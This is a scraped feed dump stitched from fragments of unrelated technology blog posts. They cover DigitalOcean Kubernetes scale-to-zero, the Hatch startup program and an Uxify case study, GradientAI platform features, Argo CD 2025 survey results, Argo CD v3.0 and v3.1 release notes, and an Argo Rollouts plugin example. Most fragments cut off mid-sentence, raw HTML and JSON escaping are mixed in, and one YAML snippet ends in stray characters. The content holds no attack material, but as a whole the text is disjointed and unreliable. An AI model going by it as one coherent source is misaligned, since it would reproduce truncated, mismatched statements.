You can now enable the node pools within your Kubernetes environment to automatically scale down to zero when idle, stopping compute charges during those periods of inactivity. This feature is optimal for development or testing environments, applications with usage patterns tied to business hours that naturally yield idle periods, or workloads that use specialized node pools like GPU or CPU-Optimized for intermittent jobs. The main components of this feature include:</p>\n<p><strong>1. Reduce node pools to zero</strong></p>\n<ul>\n<li>\n<p>Allows you to set the minimum node count (min-nodes) to 0 using the UI, CLI, or API.</p>\n</li>\n<li>\n<p>Seamless integration with your existing autoscaling configurations.</p>\n</li>\n<li>\n<p>Maintain full control over which node pools are able to scale to zero, giving you more customization and control.</p>\n</li>\n</ul>\n<p><strong>2.

By keeping infrastructure and cost management simple, the Hatch program enables startups to build tech solutions that make an impact.</p>\n<p>For Georgi Petrov and Mihail Stoychev, the co-founders and serial entrepreneurs behind <a href=\"http://uxify.com/\" rel=\"ugc nofollow noopener\" target=\"_blank\">Uxify</a>, choosing DigitalOcean to host their startup’s infrastructure was a no-brainer. They built their previous ventures NitroPack, SMSBump, and iSenseLabs on DigitalOcean and could trust the platform’s simplicity, reliability, and user experience. When it came time to power Uxify’s AI-enabled website performance solution and AI agent Uxi, they opted for DigitalOcean again  With Hatch program benefits like cloud credits and GPU Droplet discounts, Uxify could focus on building and scaling their underlying AI infrastructure.</p>\n<details class=\"collapsible\" open=\"\">\n\n<h2 id=\"building-beyond-the-original-blueprint\"><a href=\"https://www.digitalocean.com/blog.atom#building-beyond-the-original-blueprint\">Building beyond the original blueprint</a><a class=\"hash-anchor\" href=\"https://www.digitalocean.com/blog.atom#building-beyond-the-original-blueprint\"></a></h2>\n\n<p>Uxify’s story begins over a decade ago with iSenseLabs, an agency that provided services but also built and sold its own products. One of those products was NitroPack, a performance optimization tool designed to help websites load faster. As NitroPack gained traction, the team began seeing possibilities beyond their current solution.</p>\n<p>Fast forward to 2024, the team behind NitroPack reached a pivotal moment. They began rethinking web performance and user’s perception of site responsiveness… This new philosophy led them to develop Navigation AI, a performance solution focused on user experience rather than purely technical metrics. Around the same time, NitroPack was acquired by WP Engine. As part of that acquisition, the emerging Navigation AI project was spun out into a new company: Uxify.</p>\n</details>\n<details class=\"collapsible\" open=\"\">\n\n<h2 id=\"the-cloud-platform-they-trust-again-and-again\"><a href=\"https://www.digitalocean.com/blog.atom#the-cloud-platform-they-trust-again-and-again\">The cloud platform they trust, again and again</a><a class=\"hash-anchor\" href=\"https://www.digitalocean.com/blog.atom#the-cloud-platform-they-trust-again-and-again\"></a></h2>\n\n<p>When they built their first venture iSenseLabs in 2012, Petrov and Stoychev chose DigitalOcean to host their cloud infrastructure. Impressed by the products’ ease of use and deployment, the duo knew that they had found the right cloud provider for their startups. Today, they employ a full suite of DigitalOcean products including Droplets, GPU Droplets, Managed Kubernetes, and Load Balancers.</p>\n<p>“As a startup, time to market is essential and the simplicity of DigitalOcean cut all the noise and removed a lot of bureaucracy compared to some of the other providers. DigitalOcean has been amazing. It has always been there, always reliable, always predictable, and always easy to track what is going on. In the rare cases where we have something that is going off the charts, it’s easy to understand where the issue is and fix it.”</p>\n<p>— Georgi Petrov, CEO @ Uxify</p>\n<p>Uxify also isn’t Petrov and Stoychev’s first startup to go through the Hatch program. While building NitroPack, their venture capital investor, <a href=\"https://www.11.vc/\" rel=\"ugc nofollow noopener\" target=\"_blank\">Eleven</a>, informed them that they had an offering with the Hatch program. After reaping the benefits of the program the first time, they decided to apply for the Hatch program again with Uxify. The credits provided by the Hatch program allowed them to experiment with their infrastructure for both NitroPack and Uxify without worrying about costs during the pre-revenue phase of their businesses.</p>\n<p>Why DigitalOcean? According to Petrov, DigitalOcean has always been startup-friendly. Back in 2018, they were asked to be a part of DigitalOcean’s Kubernetes beta program. “DigitalOcean was very responsive in listening to feedback and improving the solution, which is why we continue to use it,” says Petrov.</p>\n</details>\n<details class=\"collapsible\" open=\"\">\n\n<h2 id=\"chasing-purpose-not-profit\"><a href=\"https://www.digitalocean.com/blog.atom#chasing-purpose-not-profit\">Chasing purpose, not profit</a><a class=\"hash-anchor\" href=\"https://www.digitalocean.com/blog.atom#chasing-purpose-not-profit\"></a></h2>\n\n<p>Founding a startup involves countless sleepless nights, putting out operational fires, and an abundance  of caffeine. Although it’s challenging, Petrov continues founding companies because he enjoys creating value for others.</p>\n<p>“After the first major acquisition with SMSBump, we felt a little bit empty. It’s a lifetime achievement. It’s a milestone. You get somewhere and you say, ‘Okay, I know I should be a successful guy,’ but actually, you feel a little bit empty because you stop the day-to-day thinking of how to create more value for someone else,” says Petrov. “After a few months of feeling that way, we said, ‘okay, we need to continue to being useful for others.’”</p>\n<p>Uxify is moving toward its full launch to bring performance insights to website owners everywhere. By joining the Hatch program, founders like Petrov and Stoychev are able to build, experiment, and scale, developing products that delight and create value for their customers.</p>\n<p>Startups accepted into Hatch receive*:</p>\n<ul>\n<li>\n<p>Up to $100,000 in compute credits</p>\n</li>\n<li>\n<p>Privilege GradientAI NVIDIA H100 GPU Droplet pricing of $1.90/hour/GPU</p>\n</li>\n<li>\n<p>Privilege GradientAI NVIDIA H100 GPU Kubernetes pricing of $1.90/hour/node</p>\n</li>\n<li>\n<p>3 months of free GPU usage for select startups</p>\n</li>\n<li>\n<p>Complimentary Standard-tier support</p>\n</li>\n<li>\n<p>GradientAI Platform usage with Hatch credits</p>\n</li>\n<li>\n<p>Access to a thriving community of founders and builders</p>\n</li>\n</ul>\n<p>*Note that GPU Droplet, GPU Kubernetes, and Bare Metal usage will not be covered by Hatch compute credits.

New features like external data integration, agent traceability, customer conversation logs, and agent evaluation give you deeper visibility into how your agents behave, more control over their data and logic, and better ways to collaborate across teams—all without adding infrastructure overhead.</p>\n<p>Since the <a href=\"https://www.digitalocean.com/blog/introducing-generative-ai-platform\">initial release in January 2025</a>, we’ve launched a wide range of enhancements driven by real-world adoption and evolving use cases. From foundational infrastructure upgrades to powerful new developer tools, here’s what’s changed between public preview and General Availability:</p>\n<ul>\n<li><strong>External data integration:</strong> Connect external files and documents from  Amazon S3 through API or control panel. This makes it easier to bring real-world context into your agents using RAG; for example, getting questions about internal documentation answered, generating summaries, or powering customer support agents.</li>\n<li><strong>Agent traceability:</strong> New debugging tools show you how each request flows through your agent, including routing decisions, token counts, and system messages. This helps you pinpoint issues, improve accuracy, and optimize performance in production.</li>\n<li><strong>Customer conversation logs:</strong> Capture and store agent interactions across your app, playground, or widget. With role-based access controls (RBAC) and data retention controls, you can export and analyze logs for analyzing user behavior, training better agents, or supporting audit and compliance needs.</li>\n<li><strong>Agent evaluations:</strong> Run structured tests to assess your agents before deployment. You can use customizable templates to benchmark quality, safety, and accuracy. Agent evaluations are ideal for regression testing, tuning performance, or validating agents for high-stakes use cases.</li>\n<li><strong>Workspaces:</strong> Workspaces act as containers for your agents and their resources, making it easy to isolate projects, manage team access, and collaborate across environments. Whether you’re experimenting, supporting multiple clients, or working across teams, workspaces bring structure and clarity at scale.</li>\n<li><strong>Improved agent management:</strong> We added versioning, usage insights, and integrated views for linked KBs, functions, and guardrails, all in a more intuitive agent management experience. This makes it easier to track changes, roll back versions, and manage complex agents confidently.</li>\n<li><strong>More models, more flexibility:</strong> Support for newer models like GPT-4o, Claude 3.5, and DeepSeek R1 has been added. This lets you choose the best model for your specific workload, whether you’re prioritizing speed, accuracy, or cost.</li>\n</ul>\n<p><img alt=\"DigitalOcean Gradient Platform\" src=\"https://doimages.nyc3.cdn.digitaloceanspaces.com/002Blog/EngineeringBlogImages_Grace/Blog%20Image%20-%20GradientAI%20Platform%20Stack.png\" /></p>\n</details>\n<details class=\"collapsible\" open=\"\">\n\n<h2 id=\"just-need-model-access-we-ve-got-you-covered\"><a href=\"https://www.digitalocean.com/blog.atom#just-need-model-access-we-ve-got-you-covered\">Just need model access?

      "summary": "<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*_-6V9xGQM6vGmsiD_dNEog.png\" /></figure><p>The results of the 2025 Argo CD user survey are in! We had a fantastic response, with 185 submissions, which shows the community is more engaged than ever.</p><p>This year, our goal was to capture a well-rounded view of how folks use Argo CD. We strive to stay closely connected to our users, understand where we’re excelling, and identify current pain points so we can prioritize improvements and proactively address community needs.</p><p>This year’s theme is environment promotion, as it has emerged as one of the most significant pain points currently experienced by Argo CD users.</p><p>Here’s what we learned.</p><h4>TL;DR</h4><p>Argo CD is growing fast and becoming a standard for deployments to production!</p><p>Compared to 2023, significantly more organizations rely on it in production. Over 60% of respondents have been actively using it in Production for more than 2 years. Patterns like ApplicationSets and self-healing have become widely adopted. Argo CD is increasingly being used at scale, with instances managing more applications, often spanning multiple clusters. We can expect scalability and performance to become the pressure points, as well as growing interest in enterprise-like capabilities from the community.</p><p>Environment promotion is where things start to get tricky. Most teams still lean on custom scripts or manual steps to get the job done. Many organizations seek solutions to improve traceability and visibility, and to standardize workflows across environments. We will likely see more maturity and new capabilities in this area.</p><p>We’re also seeing more applications under management overall, with organizations connecting more clusters to each Argo CD instance, yet still running just one to five instances. This trend points to growing pressure on instance scalability and performance.</p><p>A few more highlights from the results:</p><ul><li>Argo Labs projects like Argo CD Image Updater, Argo CD Operator, and Argo CD Vault Plugin are gaining traction, reflecting a push toward automation.</li><li>Helm is by far the most popular Argo CD installation method.</li><li>Platform engineers now make up a larger share of the community, reflecting broader organizational shifts.</li></ul><h4>What do developers really think of Argo CD?</h4><p>We kicked off the survey by asking users how likely they were to recommend Argo CD to others — one of the simplest ways to get a feel for overall satisfaction.</p><p>The 2025 result? Overwhelmingly positive 🎉 Even more users this year said they’d recommend Argo CD compared to an already strong showing in 2023. That shift says a lot about how far the tool has come and the growing trust the community has in it. In fact, Argo CD achieved an impressive Net Promoter Score (NPS) of 79 — an increase of 3 points from two years ago — highlighting exceptional user satisfaction!</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*ZY4tGNGXZGrHgLfn\" /></figure><p>We were overwhelmed by the encouraging and positive comments, reflecting just how much people love the project and deeply value the vibrant Argo community. Here’s what some users had to say:</p><blockquote><em>“Argo CD is incredible, I have no idea how we survived without it in the past.”</em></blockquote><blockquote><em>“Thanks for this great tool ❤️”</em></blockquote><blockquote><em>“You’re awesome!”</em></blockquote><blockquote><em>“Please keep going!”</em></blockquote><blockquote><em>“Keep up the good work! :)”</em></blockquote><p>We asked which features users find most valuable. The winners?</p><ul><li>ApplicationSets</li><li>Argo CD’s intuitive UI</li></ul><p>Together, they make it much easier to manage and visualise complex deployments.</p><p>Also mentioned: auto-sync, drift detection, rollbacks, RBAC, multi-source support, and integrations.</p><h4>Who’s using Argo CD these days?</h4><p>The community remains consistent and is made up mostly of DevOps and platform engineers, but platform engineers have grown from 25% in 2023 to 37% in 2025. DevOps engineers declined slightly from 43% to 36%. This shift likely reflects the broader industry trend toward adopting a platform mindset, resulting in increased demand for dedicated platform engineering roles. Roles like architects and SREs remained steady.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*ZXUJ5osL9R28zoUn\" /></figure><h4>What does adoption look like in 2025?</h4><p>With the adoption being consistently high, 93% of respondents use Argo CD in production in 2023 and 97% in 2025, the implementation maturity grows significantly. In 2023, only 28% had used Argo CD in production for over 2 years. In 2025, that number jumped to 60%, and fewer than 10% were still evaluating or in early phases.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*e0xsvHzotjrhkIYg\" /></figure><p>Almost 60% of respondents said that 75% or more of their production applications now run on Kubernetes.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*gWqJBdpN4BHjbFFs\" /></figure><p>As Kubernetes adoption deepens, Argo CD has become an essential part of the CI/CD infrastructure. As more organizations rely on Argo CD, we’ll likely see continued investment from both the community and vendors, as well as more contributors joining the project.</p><p>When it comes to Argo CD installation, Helm is by far the top choice, followed by tools like Kustomize and Terraform. Interesting to note: 19% use cluster-wide installs versus just 10% using namespace-scoped ones.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*x4RJRiUclqZg-VgN\" /></figure><h4>What does the Argo CD footprint look like?</h4><p>The most noticeable trend is the growing number of applications. Organizations are managing bigger setups with fewer, larger instances.</p><p>In 2023, just over 15% managed more than 500 Applications; by 2025, this rose to 42%. Notably, these numbers don’t correlate with how long organizations have used Argo CD and how many applications they have.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*eRwUqAp_3dbairfo\" /></figure><p>The number of Argo CD instances is growing compared to 2023, but the increase is not as significant as the rise in the number of applications. In 2023, 77% of respondents reported having fewer than 6 instances, while this percentage fell to 64% in 2025. Nevertheless, most organizations still use only a handful of instances.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*q_ePbizmF7pE04-k\" /></figure><p>Even though the number of Argo CD instances hasn’t changed much, the number of applications certainly has! This means each instance is likely connecting to more clusters. For example, back in 2023, about 42% of instances were linked to one Kubernetes cluster. Fast forward to 2025, and that number has dropped to 25%. At the same time, the share of instances connecting to more than 20 clusters has jumped significantly, going from 5% to 25%.</p><p>In summary, organizations manage a significantly larger number of applications, with more clusters connected to a single Argo CD instance, typically keeping the number of instances between 1 and 5.</p><p>So, what does this mean for the community and the project? Well, it seems that managing lots of Argo CD instances might not be the biggest hurdle for most teams. Instead, the real pressure points are around scalability and performance as organizations push Argo CD to handle more clusters and Applications. Users are already calling out these challenges, and they’re likely to become even more important moving forward. The good news? Some of this work is already underway.</p><p><em>ℹ️ Interested in how to scale Argo CD? Take a look at the </em><a href=\"https://github.com/argoproj-labs/argocd-agent\"><em>argocd-agent project</em></a><em> or read an </em><a href=\"https://argo-cd.readthedocs.io/en/stable/operator-manual/high_availability/\"><em>article about scaling up Argo CD</em></a><em>.</em></p><p><em>If you want to contribute to measuring and improving Argo scalability, take a look at the Scalability special interest group (</em><a href=\"https://github.com/argoproj/argoproj/tree/main/sigs/sig-scalability\"><em>Argo SIG Scalability</em></a><em>).</em></p><h4>What patterns and tools are catching on?</h4><p>More and more teams are following Argo CD’s recommended practices. App-of-Apps, ApplicationSets, and built-in self-healing are now widely used to manage complex GitOps setups.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*eG5_7BB_xx5xn1U_\" /></figure><p>We also asked about sub-projects, an area that shows the ecosystem dynamics. The most used are:</p><ul><li>Argo CD Image Updater</li><li>Argo CD Operator</li><li>Argo CD Vault Plugin</li></ul><p>Like the patterns mentioned earlier, the popularity of these Argo Labs projects reflects growing efforts to make Argo CD implementations more structured and automation-friendly.</p><p><em>ℹ️ You can manage secrets with </em><a href=\"https://argo-cd.readthedocs.io/en/stable/operator-manual/secret-management/#secret-management\"><em>Kubernetes operators</em></a><em>, one of the recommended ways of managing secrets on the destination cluster. This keeps Argo CD out of direct secret management, helping avoid accidental updates and reducing the risk of leaks.</em></p><p>Image Updater is the most adopted sub-project (used by 34% of respondents). While still under active development and intended for non-critical environments, its popularity shows just how hungry teams are for better deployment and promotion automation.</p><p>But Image Updater only solves part of the deployment automation puzzle. There’s still no go-to comprehensive solution out there. We’ll explore this further in the next section on environment promotion.</p><h4>Environment promotion</h4><p>Given how widely Argo CD is used in production, we wanted to explore how teams handle environment promotion. Is it a pain point for GitOps users? And how do their approaches compare to the more traditional promotion strategies used on other platforms?</p><p>First, we looked at the number of environments teams work with. Now, most respondents use 3 or fewer. Only 12% reported having more than 8.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*lwhiMHHc0r41nELe\" /></figure><p>This introduces complexity, as teams must coordinate across multiple instances. And that’s where challenges like consistent observability start to show up.</p><p>To dig deeper into this, we asked teams about their biggest pain points. What came up most?</p><ul><li>Traceability across environments, what version of a deployed app is running where (51%)</li><li>Release gates (44%)</li><li>Understanding app health and status across environments (37%)</li><li>Keeping pipeline definitions consistent (36%)</li><li>Troubleshooting failed promotions (29%)</li></ul><p>Most teams reported multiple challenges, with traceability and release gates often mentioned together.</p><p>To understand what drives these challenges, we asked how teams promote applications across environments.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*IV4zO6ktxeE6AFz0\" /></figure><p>The most common setup is DIY. Around 67% use scripts, in-house tools, or both.</p><p>Nearly a quarter of teams handle promotions solely through manual manifest updates, and almost half use some form of manual step, often paired with scripts.</p><p>So, how can we make sense of this combination? One possibility is that teams are using Argo CD Image Updater, currently the most popular sub-project, for simple, image-only updates. For more complex tasks, like updating configuration files, many might rely on manual steps. In other words, automation helps with the easy stuff, but more involved changes still need hands-on work.</p><p><em>ℹ️ Manual manifest updates are often where teams start with Argo CD. They can work well for small setups, like a few static infrastructure manifests.</em></p><p><em>But as you scale, they tend to fall short. It’s easy to run into slower deployments, more manual overhead, and challenges around security and compliance. If you’re growing with Argo CD, it’s worth moving toward full CI/CD automation to keep things on track.</em></p><p>A few out-of-the-box solutions for automated environment promotion are starting to show up in the survey. The most mentioned, though still only used by 4% of respondents, is <a href=\"https://argo-gitops-promoter.readthedocs.io/en/latest/\">GitOps Promoter</a>. It’s part of the Argo CD ecosystem and works alongside <a href=\"https://argo-cd.readthedocs.io/en/stable/proposals/manifest-hydrator/\">Hydrator</a> to handle promotions via pull requests. Others mentioned Codefresh GitOps and Kargo.</p><p>Here’s how one person summed it up:</p><blockquote><em>“Some sort of environment promotion. Lots of players in the game now and it’s hard to settle on one. Lots of manual reviews required for manifest changes that can be tiresome to compare against other environments. Some sort of environment comparison tool would be good.”</em></blockquote><p>That quote really captures where things stand. Plenty is happening in this space, but no clear winner or standard approach just yet. As more teams adopt Argo CD and take on more advanced deployment setups, tackling challenges like traceability, testing, and consistent configuration will only become more important.</p><p>This is definitely a space to watch. Expect more tooling, more investment, and, hopefully, comprehensive user-friendly solutions soon.</p><h4>What challenges are teams facing?</h4><p>After digging into environment promotion, we zoomed out and asked about broader challenges, too.</p><p>Nearly 30% of respondents said they had no major challenges with Argo CD, which is a great sign.</p><p>The most common challenge, flagged by 37%, was environment modeling and promotion workflows (covered earlier).</p><p>Other pain points included:</p><ul><li>Troubleshooting deployments and app issues (25%)</li><li>Too much manual work or not enough automation (23%)</li><li>Limited visibility into deployment status (16%)</li></ul><h4>What features are missing?</h4><p>To wrap up, we asked what users think is missing from Argo CD. Many of the responses built on earlier themes.</p><p>Some areas users want to see improved:</p><ul><li>Support for promoting apps through stages and managing service dependencies.</li><li>Better templating in ApplicationSets, progressive syncs, and built-in promotion workflows.</li><li>Multi-cluster visibility and faster UI performance.</li><li>Enterprise-grade features like fine-grained RBAC, audit trails, Vault and Prometheus integrations, and better error messages.</li></ul><p>As teams scale up, these requests point toward a natural next step: evolving Argo CD into a full-featured, enterprise-ready platform.</p><h4>Final words</h4><p>The 2025 survey gave us a ton to think about. We saw just how far Argo CD has come, what’s working well, and what needs more attention. All these insights are gold for the project’s future evolution.</p><p>Huge thanks to everyone who took the time to share feedback!</p><p>Special shoutout to those who offered to help with case studies, blog posts, talks, or quotes. It really helps grow the community!</p><p>And thanks to Katie Lamkin-Fulsher, Dan Garfield, Henrik Blixt, Michael Crenshaw, Christian Hernandez, Regina Voloshin, Kostis Kapelonis, Jenny Blekh and Tegan Ali, who made this survey possible.</p><img alt=\"\" height=\"1\" src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=ab045f7d5d9a\" width=\"1\" /><hr /><p><a href=\"https://blog.argoproj.io/argo-cd-2025-user-survey-results-ab045f7d5d9a\">Argo CD 2025 User Survey Results</a> was originally published in <a href=\"https://blog.argoproj.io\">Argo Project</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>",

With v3.1, the first batch of features comes out of the gate; featuring <a href=\"https://opencontainers.org/\">OCI</a> support, CLI Plugins, Hydrator updates, UI improvements, plus much more.</p><p>Along with new features, this release comes with a whole slew of security fixes, bug fixes, and general quality of life improvements.</p><p>You can download the v3.1 Release Candidate on the <a href=\"https://github.com/argoproj/argo-cd/releases/tag/v3.1.0-rc1\">Argo CD Releases Page</a>!</p><p>We are really excited to have you try out the new features and look forward to any feedback from the border community! With that, let’s dive into what this release holds!</p><h3>OCI Support</h3><p>Argo CD has supported obtaining Kubernetes manifests from either a Git repository, a Helm chart repository, and later support for getting manifests from a Helm chart stored within an Open Container Initiative (OCI) registry. As OCI registries have more frequently been used to store content aside from container images, more and more projects have been adding support for using OCI as a storage mechanism and a source of truth.</p><p>Starting with Argo CD v3.1, we now support OCI by enabling the use of OCI-compliant container registries as sources for configuration artifacts. This means Argo CD can pull Kubernetes manifests packaged as OCI artifacts from registries that follow the OCI image and distribution specifications. This enhances security and portability, as it allows users to leverage the same registries they use for container images to also store and distribute deployment configurations. Argo CD OCI support comes into beta with this release.</p><p>BIG thanks to <a href=\"https://github.com/blakepettersson\">@blakepettersson</a> from Akuity for leading this effort!</p><h3>Hydrator Improvements</h3><p>Manifest changes are often just image tag bumps. For example, the manifest change associated with a code change. The manifest hydrator writes metadata to the hydrated branch to associate the hydrated commit back to its corresponding dry commit.</p><p>Starting in v3.1, the Hydrator now allows for a way to associate a dry commit with a code commit. This is done by adding information about the upstream repo url, that commit SHA hash, the author of that commit, and any messages associated with that code commit. This information is then added to the Hydrator manifest metadata; this enables future work to be able to display this metadata in the Argo CD UI.</p><p>Thanks to <a href=\"https://github.com/crenshaw-dev\">@crenshaw-dev</a> from Intuit for this improvement.</p><h3>Server-Side Apply Stabilization</h3><p>Argo CD now supports client-side apply migration, which helps transitioning from client-side apply to server-side apply by moving a resource’s managed fields from one manager to Argo CD’s manager. This feature is particularly useful when you need to migrate existing resources that were created using kubectl client-side apply to server-side apply with Argo CD. You can also specify your own field manager to migrate from using an annotation. This is useful when you have other operators managing resources that are no longer in use and would like Argo CD to own all the fields for that operator.</p><p>Thanks to <a href=\"https://github.com/pjiang-dev\">@pjiang-dev</a> from Intuit for this contribution.</p><h3>UI Parameterized Action</h3><p>The Argo CD UI in many ways is the first Kubernetes dashboard, providing not only a UI for GitOps users; but also a feature rich UI for Kubernetes end users. In this release, we’ve added the ability to perform additional action on Kubernetes resources, beyond just deleting.</p><p>This feature enables users to scale resources directly from the Argo CD UI. Users will be able to increase or decrease the number of replicas (Pods) for Deployments and StatefulSets by using an input field. The feature aims to enhance user experience, especially for non-technical users, by eliminating the need to modify configuration files or use kubectl commands for scaling.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*7C4pCbBqylNOEFKm\" /><figcaption>Scaling resource from Argo CD UI</figcaption></figure><p>Thanks to <a href=\"https://github.com/ratulbasak\">@ratulbasak</a> from Deutsche Bank for contributing!</p><h3>And We Didn’t Stop There</h3><p>There are other notable updates/improvements in this release.</p><ul><li>Similar to the <a href=\"https://kubernetes.io/docs/tasks/extend-kubectl/kubectl-plugins/\">kubectl plugin mechanism</a>, support for <em>argocd</em> <a href=\"https://github.com/argoproj/argo-cd/pull/20074\">CLI plugins</a> is available in this release. — <a href=\"https://github.com/nitishfy\">@nitishify</a></li><li>You can now <a href=\"https://github.com/argoproj/argo-cd/pull/22482\">explicitly set auto-sync</a> on an Application — <a href=\"https://github.com/aali309\">@aali309</a></li><li>The sync option <em>SkipDryRunOnMissingResource</em> was only available as an annotation before; now you can set this as an Application sync option — <a href=\"https://github.com/pasha-codefresh\">@pasha-codefresh</a></li><li>Improvements to <a href=\"https://github.com/argoproj/argo-cd/pull/22781\">AppSet Progressive Sync in the UI</a>, paving the path for it to enter Beta — <a href=\"https://github.com/aali309\">@aali309</a></li><li><a href=\"https://github.com/argoproj/argo-cd/pull/23057\">Add cooldown</a> to prevent resetting autoheal exp backoff preemptively — <a href=\"https://github.com/gdsoumya\">@gdsoumya</a></li><li><a href=\"https://github.com/argoproj/argo-cd/pull/22864\">Added GitHub API metrics</a> to better debug rate limiting — <a href=\"https://github.com/reggie-k\">@reggie-k</a></li></ul><h3>Dependency, Platform, and Security Updates</h3><p>Some notable dependency, platform, and security updates included in v3.1</p><p><strong>Go 1.24.4</strong></p><ul><li>All builds, CI, and images now use the latest Go.

Several of these configurations have become best practices or necessities. Some of the new defaults include:</p><ul><li>Use annotations for <a href=\"https://argo-cd.readthedocs.io/en/latest/user-guide/resource_tracking/\">resource tracking</a> (<a href=\"https://github.com/argoproj/argo-cd/pull/22289\">#22289</a> by <a href=\"https://github.com/terrytangyuan\">@terrytangyuan</a> and <a href=\"https://github.com/crenshaw-dev\">@crenshaw-dev</a>)</li><li>Enable RBAC on pod logging by default just like we do for container exec.

Since then we have noticed a number of emerging anti-patterns and have made the decision to publish recommendations on secrets management. (<a href=\"https://github.com/argoproj/argo-cd/issues/21629\">#21629</a> by <a href=\"https://github.com/crenshaw-dev\">@crenshaw-dev</a>)</p><p>Specifically, we endorse using secrets operators and caution against using config management plugins to inject secrets. We recommend <a href=\"https://argo-cd.readthedocs.io/en/release-3.0/operator-manual/secret-management/\">reading the updated documentation on secrets</a>.</p><h4>Upgrading from Argo CD 2.x to Argo CD 3.0</h4><p>Argo CD 3.0 should be a low risk upgrade. We’ve put together a <a href=\"https://argo-cd.readthedocs.io/en/latest/operator-manual/upgrading/2.14-3.0/\">full guide to upgrading to Argo CD 3.0</a>. This includes how to identify if a configuration needs to be changed and if applicable how to retain Argo CD 2.x behavior.</p><p>Beyond following the full guide above, all potentially <a href=\"https://github.com/argoproj/argo-cd/issues?q=is%3Aissue%20state%3Aclosed%20milestone%3Av3.0\">breaking changes can be found on Github</a>.</p><h4>Ongoing and End of Life Support for Argo CD 2.x</h4><p>Following our documented <a href=\"https://argo-cd.readthedocs.io/en/stable/developer-guide/release-process-and-cadence/#release-cycle\">release cadence</a> and <a href=\"https://github.com/argoproj/argo-cd/security/policy#supported-versions\">security policy</a> we support the last three minor releases for security fixes and critical issues.

We see opportunities for better performance and ease of use by only deprecating those configurations, setting smarter defaults and encouraging more best practices.</p><p>Argo CD 3.0 sets the stage for us to bring the next generation of features along with performance and scalability improvements the community hungers for.</p><p>This release will improve UX, security and performance by:</p><ol><li>Introducing additional recommended configurations out of the box, thus reducing required effort to achieve more secure and performant Argo CD configurations</li><li>Dropping support for legacy configuration options, that we discourage using</li></ol><p>With time and community feedback, we realized that certain <em>optional</em> configurations should in fact be the <em>default</em>, since many users explicitly configure those. One such example would be some performance-related configurations.</p><p>This release will also address long-existing technical debt, caused by supporting legacy configurations we started with when Argo CD was young, and which we no longer recommend on using, as Argo CD had matured.</p><h3><strong>What Is Changing in This Version?</strong></h3><p><a href=\"https://github.com/argoproj/argo-cd/milestone/27?closed=1\">Here</a> is a non-exhaustive list of changes in this release, among those:</p><ol><li><a href=\"https://github.com/argoproj/argo-cd/issues/19768\">Removal</a> of support for legacy argocd-cm repository config</li><li>Enabling fine-grained update/delete RBAC enforcement <a href=\"https://github.com/argoproj/argo-cd/issues/19988\">by default</a></li><li>Making applyNestedSelectors: true the <a href=\"https://github.com/argoproj/argo-cd/issues/14152\">default and only</a> option for matrix/merge generators</li><li>Having an <a href=\"https://github.com/argoproj/argo-cd/issues/21629\">opinion</a> on secrets — while we remained un-opinionated regarding secret management with Argo CD since day 1, maintainability and security lessons learned surfaced the need to be better aligned with the industry in this domain</li><li><a href=\"https://github.com/argoproj/argo-cd/issues/21207\">Preventing</a> the usage of in-cluster, when in-cluster is explicitly disabled</li></ol><h3>Backwards Compatibility &amp; Migration</h3><p>We aim for v3 release to be so inoffensive, that upgrading to 3.0 is almost as easy as upgrading between 2.x minor versions has been.</p><p>For each change, the documentation will contain clear description of:</p><ol><li>What the change is</li><li>How to determine whether the user is affected by the change (i.e which command to run)</li><li>How to migrate</li><li>For relatively high-risk changes - how to opt out (i.e switch back to the old default)</li></ol><h3>Get Involved</h3><p>You can read the full proposal <a href=\"https://github.com/argoproj/argo-cd/issues/21422\">here</a>.

With this plugin system, you are now able to <a href=\"https://argo-rollouts.readthedocs.io/en/stable/features/canary/plugins/\">create a plugin and execute your own steps</a> during the canary analysis. This extends Argo Rollouts capabilities and enriches the progressive delivery experience to accommodate a multitude of scenarios. It is a continuation of the previous work that was done to create a pluggable system for traffic routers and metric providers in the v1.5 release.</p><p>You can refer to the <a href=\"https://argo-rollouts.readthedocs.io/en/latest/plugins/\">documentation</a> to learn more about creating a plugin. Once implemented, it can be configure in the argo-rollouts-config ConfigMap:</p><pre>apiVersion: v1<br />kind: ConfigMap<br />metadata:<br />  name: argo-rollouts-config<br />data:<br />  stepPlugins: |-<br />    - name: &quot;argoproj-labs/step-exec&quot; # name of the plugin<br />      location: &quot;file://./my-custom-plugin&quot; # supports http(s):// urls and file://Ya</pre><p>Users can then configure this plugin as part of their canary steps:</p><pre>apiVersion: argoproj.io/v1alpha1<br />kind: Rollout<br />metadata:<br />  name: example-plugin-ro<br />spec:<br />  strategy:<br />    canary:<br />      steps:<br />        - plugin:<br />            name: argoproj-labs/step-exec<br />            config:<br />              command: echo &quot;hello world&quot;</pre><p>While these plugins do not require to be open-source, we are looking forward to what the community will implement in the upcoming months.

